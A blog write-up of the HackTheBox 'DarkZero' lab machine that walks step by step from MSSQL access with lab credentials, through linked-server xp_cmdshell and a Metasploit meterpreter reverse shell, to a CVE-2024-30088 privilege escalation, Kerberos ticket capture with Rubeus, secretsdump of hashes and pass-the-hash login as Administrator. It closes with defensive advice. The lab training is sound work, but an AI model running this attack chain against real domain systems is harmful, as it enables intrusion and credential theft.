<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/pentesting/htb/htb2/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content="DarkZero HTB"><meta property="og:description" content="A detailed walkthrough of the HackTheBox DarkZero machine including initial enumeration, database exploitation, and privilege escalation to domain admin."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="pentesting"><meta property="article:published_time" content="2025-10-07T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content="DarkZero HTB"><meta name=twitter:description content="A detailed walkthrough of the HackTheBox DarkZero machine including initial enumeration, database exploitation, and privilege escalation to domain admin."><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="hacking articles,hacking articles blog,hacking articles tutorials,hacking articles writeups,ethical hacking articles,cybersecurity articles,security hacking articles,penetration testing articles,infosec articles,cyber security hacking articles,cybersecurity,ethical hacking,CTF writeups,penetration testing,security research,bug bounty,offensive security,infosec,hackthebox,web exploitation,havoc,Richie havoc,htb,learn ethical hacking,hacking tutorials for beginners,cybersecurity tutorials,how to hack ethically,penetration testing course,security researcher blog,hacking step by step guide,ethical hacking examples,real world hacking scenarios,practical hacking exercises,Hercules,Soulmate,Darkcorp,Darkzero,Writeup,Bugbounty,htb writeups,hackthebox walkthrough,hackthebox solutions,penetration testing tutorials,linux privilege escalation,windows privilege escalation,active directory hacking,OSCP preparation,cyber security blog,vulnerability research,exploit development,reverse engineering,binary exploitation,pwn challenges,web security,network security,cryptography challenges,tryhackme,offsec labs,BoardLight HTB,Instant HTB,Sea HTB,Cicada HTB,Intuition HTB,Sightless HTB,Editorial HTB,Runner HTB,Greenhorn HTB,Blazorized HTB,Surveillance HTB,Headless HTB,Crafty HTB,Bizness HTB,Mist HTB,Usage HTB,Perfection HTB,Builder HTB,WifineticTwo HTB,Cap HTB,Analysis HTB,Keeper HTB,ctf challenges,capture the flag,cyber defense,red team operations,blue team defense,malware analysis,forensics challenges,steganography,OSINT techniques,kali linux tutorials,metasploit framework,burp suite tutorials,nmap scanning,sql injection,xss exploitation,privilege escalation techniques,buffer overflow,rop chain,shellcode development,reverse shell,web shell,docker security,kubernetes pentesting,cloud security,aws security,azure pentesting,api security testing,jwt exploitation,owasp top 10,security certifications,CEH preparation,OSWE preparation,OSCE preparation,NanoCorp HTB,NanoCorp walkthrough,NanoCorp writeup,NanoCorp HTB writeup,HTB NanoCorp exploitation,HTB NanoCorp solution,HackTheBox NanoCorp,NTLM relay attacks,NTLM relay exploitation,responder NTLM relay,ntlmrelayx tutorial,windows active directory exploitation,windows privilege escalation techniques,windows enumeration techniques,SMB relay attacks,credential discovery techniques,hard difficulty HTB machines,advanced windows hacking,active directory pentesting guide,windows security assessment,windows post exploitation,domain controller exploitation,kerberos attacks,pass the hash,lateral movement techniques,bloodhound enumeration,impacket tools,windows pentesting,HTB hard machines 2025,HTB season 9 machines,advanced AD attacks,HTB NanoCorp writeup,HTB NanoCorp Machine writeup,nanocorp.htb,CVE-2025-24071,HTB NanoCorp exploitation,DCOM exploitation,Windows DCOM attacks,DACL Abuse,best hacking articles website,top cybersecurity writeup blogs,where to find CTF writeups,detailed penetration testing tutorials,comprehensive hacking guides,step by step hacking tutorials,beginner to advanced ethical hacking,free hacking learning resources,cybersecurity blog 2025,latest hacking techniques,modern exploitation methods,practical security research,how to solve CTF challenges,how to hack hackthebox machines,privilege escalation methods explained,web application security testing,how to find vulnerabilities,penetration testing methodology,OSCP exam preparation tips,HTB machine walkthrough,CTF challenge solutions,security assessment guide,metasploit tutorials,burp suite guides,nmap cheat sheet,gobuster usage,hydra brute force,sqlmap injection,netcat reverse shell,wireshark packet analysis,john the ripper tutorial,hashcat cracking guide,OSCP certification preparation,CEH study materials,bug bounty hunter tips,cybersecurity career guide,penetration tester roadmap,ethical hacker certification,security researcher career path,infosec job preparation,2025 hacking tutorials,latest CVE exploits,zero day vulnerabilities,current cybersecurity threats,modern web exploitation,cloud security testing,API security vulnerabilities,container security hacking,AI security research,machine learning vulnerabilities,alternative to ippsec,similar to hackingarticles,best ctf writeup sites,top penetration testing blogs,ethical hacking resources,cybersecurity learning platforms,hacking practice labs,hacking community,infosec community blog,cybersecurity forum,ethical hacking discord,CTF community,bug bounty community,security researchers network"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/pentesting/htb/htb2/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/pentesting/htb/htb2/"><meta property="og:title" content="DarkZero HTB"><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-10-07T00:00:00Z"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="article:author" content="Richie-Havoc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/pentesting/htb/htb2/"><meta name=twitter:title content="DarkZero HTB"><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="pentesting"><meta name=article:subtitle content="‚ö° A Deep Dive into DarkZero ‚ö°"><meta name=article:summary content=" A detailed walkthrough of the HackTheBox DarkZero machine including initial enumeration, database exploitation, and privilege escalation to domain admin."><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="¬© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content="DarkZero HTB"><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"HowTo","name":"DarkZero HTB","description":"A detailed walkthrough of the HackTheBox DarkZero machine including initial enumeration, database exploitation, and privilege escalation to domain admin.","image":"","datePublished":"2025-10-07T00:00:00Z","author":{"@type":"Person","name":"Richie-Havoc"},"publisher":{"@type":"Person","name":"Richie-Havoc"}}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Pentesting","item":"https:\/\/havocsec.me\/pentesting/"},{"@type":"ListItem","position":3,"name":"DarkZero HTB","item":"https:\/\/havocsec.me\/pentesting\/htb\/htb2\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><meta name=htb-status content="active"><meta name=htb-retire content="2025-12-31"><meta name=htb-machine content="DarkZero HTB"><script defer src=/js/htb-lock.min.8e60d76f7ed9b9c13cf2e4c3a5c793c6d1c62fe602afb5e4ef6143c03afca885.js integrity="sha256-jmDXb37ZucE88uTDpceTxtHGL+YCr7Xk72FDwDr8qIU="></script><link rel=stylesheet href=/css/htb-lock.min.189e4cc3c0aae97ea28bae651944806deba67932e2f485e2d05d9d4771ff1d07.css integrity="sha256-GJ5Mw8Cq6X6ii65lGUSAbeumeTLi9IXi0F2dR3H/HQc="><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
</button>
<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">DarkZero HTB</h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">‚ö° A Deep Dive into DarkZero ‚ö°</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Oct 7, 2025 - 5 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/root_hu628b3644df2c57547473702c3a6cd7fc_132667_filter_11492400015018413633.webp alt="feature image" height=693 width=736>
<span class="mb-4 mt-1 text-center text-sm text-slate-700 dark:text-slate-200">challenges</span></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><h1 id=darkzero-htb-walkthrough-from-database-to-domain-admin>DarkZero HTB Walkthrough: From Database to Domain Admin</h1><p>Hey everyone! üëã Today I&rsquo;m excited to share my walkthrough of the DarkZero machine from Hack The Box. This was a challenging Windows Active Directory environment that taught me some advanced penetration testing techniques. Let me break it down in a simple, friendly way so everyone can follow along!</p><h2 id=-quick-overview>üéØ Quick Overview</h2><p><strong>DarkZero</strong>¬†is a medium-difficulty Windows machine that involves:</p><ul><li>MSSQL database exploitation</li><li>Linked server abuse</li><li>Kerberos ticket attacks</li><li>Multiple domain controller compromise</li></ul><p><strong>Time to root:</strong>¬†depends on your understanding and speed.<br><strong>Key lesson:</strong>¬†When one door closes, find another window!</p><h2 id=-step-1-initial-reconnaissance>üîç Step 1: Initial Reconnaissance</h2><p>First, I scanned the target to see what services were running:</p><p><code>nmap -sV -sC -T4 10.10.11.89</code></p><p><img src=images/nmap1.png alt=nmap>
<img src=images/nmap2.png alt=nmap2>
The scan revealed several interesting services:</p><ul><li><strong>Port 1433</strong>: Microsoft SQL Server - our main entry point!</li><li><strong>Port 445</strong>: SMB file sharing</li><li><strong>Port 5985</strong>: WinRM for remote management</li><li>Plus all the usual Active Directory ports (LDAP, Kerberos, etc.)</li></ul><p>I also discovered the domain controller was &ldquo;multihomed&rdquo; - meaning it had two IP addresses (10.10.11.89 and 172.16.20.1). This would become important later!
<img src=images/dig.png alt=image></p><p>further enumeration revealed that Host is CLEAN or some ports are blocked</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>smb2-time: | date: 2025-10-05T08:36:38 
</span></span><span style=display:flex><span>start_date: N/A 
</span></span><span style=display:flex><span>Windows Domain Controller <span style=color:#f92672>(</span>hostname DC01,
</span></span><span style=display:flex><span>domain darkzero.htb<span style=color:#f92672>)</span> Kerberos present <span style=color:#f92672>(</span>port 88<span style=color:#f92672>)</span> 
</span></span><span style=display:flex><span>SMB with message signing required which prevents NTLM relay LDAP / LDAPS <span style=color:#f92672>(</span>389/636/3268/3269<span style=color:#f92672>)</span> <span style=color:#66d9ef>for</span> full AD enumeration via LDAP queries MSSQL <span style=color:#f92672>(</span>1433<span style=color:#f92672>)</span> which exposes Windows database Certificates on DC <span style=color:#f92672>(</span>DC01.darkzero.htb<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>AD CS might be present or certificate templates used Clock-skew requires a time zone match for Kerberos requests Basic With the prized &ldquo;John W&rdquo; credentials in hand, i unleashed Netexec to conduct focused reconnaissance and preliminary enumeration.</p><p>`nxc smb dc01.darkzero.htb -u &lsquo;john.w&rsquo; -p &lsquo;RFulUtONCOL!&rsquo; &ndash;users
<img src=images/nxc.png alt=image></p><p>Enumerated 4 local users</p><p>darkzero Shares.</p><p><code>nxc smb dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' --shares</code>
<img src=images/nxcshares.png alt=image></p><p>furthermore i used bloodhound to dump everything once and for all.
`bloodhound-python \ -dc &lsquo;dc01.darkzero.htb&rsquo; -d &lsquo;darkzero.htb&rsquo; \ -u &lsquo;john.w&rsquo; -p &lsquo;RFulUtONCOL!&rsquo; \ -ns $target_ip &ndash;zip -c All</p><p><img src=images/bloodhound2.png alt=image></p><p>No obvious privilege-escalation vectors surfaced. However, the ingestion revealed a domain-trust relationship: This denotes a bidirectional trust. <strong>DARKZERO.EXT</strong> can authenticate into <strong>DARKZERO.HTB</strong> and <strong>DARKZERO.HTB</strong> can authenticate into <strong>DARKZERO.EXT</strong> thats effectively a two-way trust and Boom i alted my recon</p><h2 id=step-2-finding-our-first-entry>Step 2: Finding Our First Entry</h2><p>The SQL Server on port 1433 looked promising. I tried connecting with some default credentials and struck gold:</p><p><code>impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!'@10.10.11.89 -windows-auth</code></p><p><img src=images/mysql.png alt=image>
<strong>Success!</strong>¬†I was in the SQL database. But when I tried to enable command execution, I hit a roadblock - insufficient privileges on DC01.</p><h2 id=-step-3-the-linked-server-trick>üîó Step 3: The Linked Server Trick</h2><p>Here&rsquo;s where things got interesting. I discovered a &ldquo;linked server&rdquo; to another domain controller called DC02:</p><p><code>enum_links</code>
<img src=images/enum.png alt=image></p><p>Linked servers let SQL servers talk to each other. Even better - when I switched to the DC02 linked server, I had higher privileges!</p><p><code>use_link "DC02.darkzero.ext"</code>
<code>enable_xp_cmdshell</code>
<code>xp_cmdshell whoami</code></p><p><img src=images/xp_cmdshell.png alt=image>
<strong>Why this worked:</strong>¬†The SQL service on DC01 connected to DC02 using different credentials (<code>dc01_sql_svc</code>) that had admin privileges on DC02. It&rsquo;s like having a friend who can open doors you can&rsquo;t!</p><h2 id=step-4-getting-our-first-shell>Step 4: Getting Our First Shell</h2><p>Now with command execution on DC02, I used Metasploit&rsquo;s web_delivery module to get a reverse shell:</p><h1 id=on-my-kali-machine>On my Kali machine</h1><p>``msfconsole -q
<code>use multi/handler</code>
<code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>
<code>set LHOST tun0 ;</code>
<code>set LPORT 4444 ; </code><code>exploit</code></p><p><img src=images/meterpreter.png alt=image></p><h1 id=in-the-sql-session>In the SQL session</h1><p><strong>Boom!</strong>¬†I had a meterpreter shell as¬†<code>svc_sql</code>¬†on DC02. Checking the network interfaces, I saw I was on the internal network (172.16.20.2).</p><h2 id=step-5-becoming-system>Step 5: Becoming SYSTEM</h2><p>My¬†<code>svc_sql</code>¬†user had limited privileges, so I needed to escalate. I used CVE-2024-30088, a Windows privilege escalation vulnerability:</p><p><code>use exploit/windows/local/cve_2024_30088_authz_basep</code>
<code>set SESSION 1</code>
<code>set LHOST tun0 </code><code>set LPORT 4445</code>
<code>set AutoCheck false</code>
<code>exploit</code></p><p><img src=images/meterpreter2.png alt=image>
<strong>Success!</strong>¬†I was now NT AUTHORITY\SYSTEM - the Windows equivalent of root. I could now read the user flag:</p><p><img src=images/cve.png alt=image></p><p>`type C:\Users\Administrator\Desktop\user.txt
<img src=images/use.txt.png alt=image></p><h2 id=step-6-the-kerberos-ticket-heist>Step 6: The Kerberos Ticket Heist</h2><p>This was the coolest part! I used a tool called Rubeus to capture Kerberos tickets. Here&rsquo;s how it worked:</p><ol><li><p><strong>Upload Rubeus</strong>¬†to DC02</p><p><img src=images/upload.exe.png alt=image></p></li><li><p><strong>Start monitoring</strong>¬†for new tickets:
<code>Rubeus.exe monitor /interval:1 /nowrap</code></p><p><img src=images/fresh%20ticket.png alt=image></p></li><li><p><strong>Trigger authentication</strong>¬†from DC01 to DC02:
<code>xp_dirtree '\\DC02.darkzero.ext\share'</code></p><p><img src=images/trigger_auth.png alt=image></p></li></ol><p>When DC01 tried to access the fake share on DC02, it had to authenticate. Rubeus captured this authentication attempt and gave me DC01&rsquo;s Kerberos ticket!</p><p><strong>Think of it like this:</strong>¬†I tricked DC01 into showing me its ID card, then I made a copy of it.That would be the coolest part to explain it like that.<strong><code>laughs</code></strong></p><h2 id=step-7-converting-and-using-the-ticket>Step 7: Converting and Using the Ticket</h2><p>The captured ticket was in base64 format, so I needed to convert it:</p><p><code>cat ticket.bs4.kirbi | base64 -d > ticket.kirbi</code></p><p>Then, I converted it to a format usable by Impacket:
<code>impacket-ticketConverter ticket.kirbi dc01_admin.ccache</code>
<code>export KRB5CCNAME=dc01_admin.ccache</code>
<img src=images/tocache.png alt=image></p><p>Now I had a valid Kerberos ticket for DC01&rsquo;s machine account. I could use this to dump all the password hashes from DC01:</p><p>`impacket-secretsdump -k -no-pass &lsquo;<a href=mailto:darkzero.htb/DC01$@DC01.darkzero.htb>darkzero.htb/DC01$@DC01.darkzero.htb</a>&rsquo;</p><p><img src=images/ketys.webp alt=image></p><h2 id=-step-8-domain-admin-and-root-flag>üèÜ Step 8: Domain Admin and Root Flag</h2><p>The hash dump gave me the Administrator password hash. I used this to log into DC01:</p><p>`evil-winrm -i 10.10.11.89 -u Administrator -H []
<img src=images/evil.png alt=image></p><p>And finally, the moment of truth:</p><p>`type C:\Users\Administrator\Desktop\root.txt
<img src=images/flag.png alt=image>
<strong>Domain owned!</strong>¬†üéâ</p><h2 id=key-takeaways>Key Takeaways</h2><ol><li><strong>Linked servers are dangerous</strong>¬†- They can provide privilege escalation paths between database servers</li><li><strong>Kerberos monitoring is powerful</strong>¬†- Tools like Rubeus can capture valuable authentication material</li><li><strong>Persistence pays off</strong>¬†- I faced clock sync issues but found alternative methods</li><li><strong>Think laterally</strong>¬†- The path to domain admin went through multiple systems</li></ol><h2 id=defense-recommendations>Defense Recommendations</h2><blockquote><p>For defenders:</p></blockquote><ul><li><strong>Monitor linked server configurations</strong>¬†- They shouldn&rsquo;t use high-privilege accounts</li><li><strong>Watch for Kerberos anomalies</strong>¬†- Unexpected ticket requests can indicate attack activity</li><li><strong>Segment internal networks</strong>¬†- Even if attackers get in, limit their lateral movement</li><li><strong>Regularly patch</strong>¬†- The CVE-2024-30088 exploit worked because of unpatched systems</li></ul><h2 id=-what-i-learned>üéì What I Learned</h2><p>This machine taught me that sometimes the most complex attacks are just a series of simple steps chained together. Each barrier I hit became an opportunity to learn a new technique.</p><p>The satisfaction of finally seeing that root flag after hours of troubleshooting was incredible! That&rsquo;s what makes Hack The Box so addictive. üòÑ</p><blockquote><p><strong>Happy hacking everyone!¬†Remember - practice ethically and always keep learning.</strong></p></blockquote></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
2025
Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>